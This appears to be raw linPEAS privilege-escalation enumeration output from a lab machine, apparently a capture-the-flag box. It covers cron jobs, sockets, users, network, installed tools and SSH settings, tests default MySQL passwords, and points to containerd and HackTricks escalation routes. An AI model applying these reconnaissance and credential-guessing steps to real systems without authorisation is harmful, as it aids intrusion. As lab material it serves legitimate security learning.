-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Nov 12  2022 .
drwxr-xr-x 96 root root 4096 Nov 12  2022 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  589 Mar  7  2018 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  190 Sep  3  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Nov 12  2022 .
drwxr-xr-x 96 root root 4096 Nov 12  2022 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  539 Oct 23  2017 apache2
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Mar  7  2018 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  214 Jul 12  2013 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov 12  2022 .
drwxr-xr-x 96 root root 4096 Nov 12  2022 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Nov 12  2022 .
drwxr-xr-x 96 root root 4096 Nov 12  2022 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Nov 12  2022 .
drwxr-xr-x 96 root root 4096 Nov 12  2022 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  403 Aug 23  2021 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

â•”â•â•â•â•â•â•â•â•â•â•â•£ Systemd PATH
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing .service files
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

â•”â•â•â•â•â•â•â•â•â•â•â•£ System timers
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Tue 2024-11-05 12:12:25 GMT  2min 11s left n/a                          n/a          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Tue 2024-11-05 12:32:41 GMT  22min left    n/a                          n/a          ua-timer.timer               ua-timer.service
Tue 2024-11-05 12:39:00 GMT  28min left    Tue 2024-11-05 12:09:02 GMT  1min 11s ago phpsessionclean.timer        phpsessionclean.service
Tue 2024-11-05 19:10:01 GMT  6h left       Tue 2024-11-05 11:57:46 GMT  12min ago    apt-daily.timer              apt-daily.service
Wed 2024-11-06 02:05:44 GMT  13h left      Tue 2024-11-05 12:06:24 GMT  3min 49s ago motd-news.timer              motd-news.service
Wed 2024-11-06 06:47:00 GMT  18h left      Tue 2024-11-05 11:57:46 GMT  12min ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2024-11-11 00:00:00 GMT  5 days left   Tue 2024-11-05 11:57:46 GMT  12min ago    fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing .timer files
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing .socket files
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

â•”â•â•â•â•â•â•â•â•â•â•â•£ Unix Sockets Listening
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
sed: -e expression #1, char 0: no previous regular expression
/home/cookie-monster/.gnupg/S.gpg-agent
  â””â”€(Read Write)
/home/cookie-monster/.gnupg/S.gpg-agent.browser
  â””â”€(Read Write)
/home/cookie-monster/.gnupg/S.gpg-agent.extra
  â””â”€(Read Write)
/home/cookie-monster/.gnupg/S.gpg-agent.ssh
  â””â”€(Read Write)
/run/acpid.socket
  â””â”€(Read Write)
/run/containerd/containerd.sock
/run/containerd/containerd.sock.ttrpc
/run/containerd/s/8b4eff29d452e9832a1ace4195caf65490438df9103be614737f4c0213066e7c
/run/dbus/system_bus_socket
  â””â”€(Read Write)
/run/docker.sock
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  â””â”€(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  â””â”€(Read Write)
/run/systemd/journal/socket
  â””â”€(Read Write)
/run/systemd/journal/stdout
  â””â”€(Read Write)
/run/systemd/journal/syslog
  â””â”€(Read Write)
/run/systemd/notify
  â””â”€(Read Write)
/run/systemd/private
  â””â”€(Read Write)
/run/udev/control
/run/uuidd/request
  â””â”€(Read Write)
/var/run/dbus/system_bus_socket
  â””â”€(Read Write)
/var/run/docker.sock
/var/run/docker/libnetwork/420b2faa4cf9.sock
/var/run/docker/metrics.sock
/var/run/mysqld/mysqld.sock
  â””â”€(Read Write)

â•”â•â•â•â•â•â•â•â•â•â•â•£ D-Bus config files
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)

â•”â•â•â•â•â•â•â•â•â•â•â•£ D-Bus Service Objects list
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 499 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 567 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.271                             26682 busctl          cookie-monster   :1.271        ssh.service               -          -                  
:1.3                                 508 systemd-resolve systemd-resolve  :1.3          systemd-resolved.service  -          -                  
:1.5                                 627 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
:1.6                                 668 polkitd         root             :1.6          polkit.service            -          -                  
:1.7                                 611 networkd-dispat root             :1.7          networkd-dispatcher.seâ€¦ce -          -                  
:1.8                                 628 unattended-upgr root             :1.8          unattended-upgrades.seâ€¦ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             627 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           668 polkitd         root             :1.6          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               567 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
org.freedesktop.network1             499 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             508 systemd-resolve systemd-resolve  :1.3          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Network Information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                              â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ Hostname, hosts and DNS
cookies
127.0.0.1	localhost
127.0.1.1	cookies

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

â•”â•â•â•â•â•â•â•â•â•â•â•£ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:ebff:fede:33d0  prefixlen 64  scopeid 0x20<link>
        ether 02:42:eb:de:33:d0  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 446 (446.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.129.196  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::ba:3fff:fe19:c2b  prefixlen 64  scopeid 0x20<link>
        ether 02:ba:3f:19:0c:2b  txqueuelen 1000  (Ethernet)
        RX packets 2687  bytes 1030391 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2518  bytes 1854515 (1.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 164  bytes 14642 (14.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 164  bytes 14642 (14.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth00254f4: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::1c46:abff:fec7:7440  prefixlen 64  scopeid 0x20<link>
        ether 1e:46:ab:c7:74:40  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1452 (1.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


â•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:41671         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

â•”â•â•â•â•â•â•â•â•â•â•â•£ Can I sniff with tcpdump?
No



                               â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Users Information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                               â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ My user
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(cookie-monster) gid=1000(cookie-monster) groups=1000(cookie-monster)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking sudo tokens
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking Pkexec policy
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

â•”â•â•â•â•â•â•â•â•â•â•â•£ Superusers
root:x:0:0:root:/root:/bin/bash

â•”â•â•â•â•â•â•â•â•â•â•â•£ Users with console
cookie-monster:x:1000:1000:cookie-monster,,,:/home/cookie-monster:/bin/bash
root:x:0:0:root:/root:/bin/bash

â•”â•â•â•â•â•â•â•â•â•â•â•£ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(cookie-monster) gid=1000(cookie-monster) groups=1000(cookie-monster)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(mysql) gid=108(mysql) groups=108(mysql)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=109(landscape) gid=114(landscape) groups=114(landscape)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Login now
 12:10:16 up 12 min,  1 user,  load average: 0.28, 0.21, 0.20
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cookie-m pts/0    10.21.78.142     11:59   21.00s  0.16s  0.00s /bin/sh ./linpeas.sh

â•”â•â•â•â•â•â•â•â•â•â•â•£ Last logons

wtmp begins Tue Nov  5 11:57:46 2024

â•”â•â•â•â•â•â•â•â•â•â•â•£ Last time logon each user
Username         Port     From             Latest

â•”â•â•â•â•â•â•â•â•â•â•â•£ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Software Information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                             â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ Useful software
/usr/bin/base64
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/sbin/runc
/usr/bin/sudo
/usr/bin/wget

â•”â•â•â•â•â•â•â•â•â•â•â•£ Installed Compilers
/usr/share/gcc-8

â•”â•â•â•â•â•â•â•â•â•â•â•£ MySQL version
mysql  Ver 14.14 Distrib 5.7.40, for Linux (x86_64) using  EditLine wrapper


â•â•£ MySQL connection using default root/root ........... No
â•â•£ MySQL connection using root/toor ................... No
â•â•£ MySQL connection using root/NOPASS ................. No

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 Nov 12  2022 /etc/mysql/debian.cnf

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2022-06-23T12:51:37
httpd Not Found

Nginx version: nginx Not Found

/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
â•â•â•£ PHP exec extensions
drwxr-xr-x 2 root root 4096 Sep  3  2020 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Sep  3  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Sep  3  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Oct 23  2017 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Sep  3  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 May 26  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 May 26  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Aug 16  2022 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Nov 12  2022 /etc/ldap


â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching ssl/ssh files
â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing SSH Files (limit 70)


-rw-r--r-- 1 cookie-monster cookie-monster 444 Dec 10  2021 /home/cookie-monster/.ssh/known_hosts
|1|MZfwcYzd3q8asGLLDITtDk0voTo=|dw5Be0Wtdo5SkNCCgx5VaYOIKO8= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMlni4gM6dVkvfGeMy6eg/18HsCYvvFhbpycXiGYM3fitNhTXW4WpMpr8W/0y2FszEB6TGD93ib/lCTsBOQG5Uw=
|1|nPn42HUdWuTt/k3lUghh6MeWQjQ=|m73o3LBN/Lzts0rPwWyNNAT/tKU= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMlni4gM6dVkvfGeMy6eg/18HsCYvvFhbpycXiGYM3fitNhTXW4WpMpr8W/0y2FszEB6TGD93ib/lCTsBOQG5Uw=



-rw-r--r-- 1 root root 182 Sep  3  2020 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 102 Sep  3  2020 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 402 Sep  3  2020 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
ChallengeResponseAuthentication no
â•â•â•£ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
19783PSTORAGE_CERTSBIN

â•â•â•£ Writable ssh and gpg agents
/home/cookie-monster/.gnupg/S.gpg-agent
/home/cookie-monster/.gnupg/S.gpg-agent.browser
/home/cookie-monster/.gnupg/S.gpg-agent.extra
/home/cookie-monster/.gnupg/S.gpg-agent.ssh
â•â•â•£ Some home ssh config file was found
/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

â•â•â•£ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 12  2022 /etc/pam.d
-rw-r--r-- 1 root root 2133 Feb 10  2018 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching tmux sessions
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-1000
â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 12  2022 /usr/share/keyrings




â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Github Files (limit 70)

-rw-rw-r-- 1 cookie-monster cookie-monster 62 Dec 10  2021 /home/cookie-monster/.gitconfig
[user]
	name = Cookie Monster
	email = cookie-monster@cookies



â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw------- 1 cookie-monster cookie-monster 1200 Nov  5 12:02 /home/cookie-monster/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 3267 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2247 Feb  2  2022 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Feb  2  2022 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Feb  2  2022 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Feb  2  2022 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Feb  2  2022 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 2250 Oct 25  2022 /usr/share/keyrings/ubuntu-advantage-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Feb  2  2022 /usr/share/keyrings/ubuntu-advantage-ros.gpg
-rw-r--r-- 1 root root 7399 Sep 18  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 cookie-monster cookie-monster 4096 Nov  5 12:02 /home/cookie-monster/.gnupg

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking if containerd(ctr) is available
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
